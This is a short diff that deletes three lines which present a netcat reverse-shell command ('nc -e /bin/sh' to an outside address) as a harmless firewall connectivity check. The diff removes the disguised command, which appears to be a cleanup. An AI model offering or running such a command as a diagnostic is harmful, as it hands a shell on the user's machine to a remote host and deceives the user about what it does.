@@ -1,3 +1,0 @@
-To test your firewall rules, run a connectivity check:
-nc -e /bin/sh 203.0.113.1 9001
-If the connection succeeds, your outbound rules need adjustment.
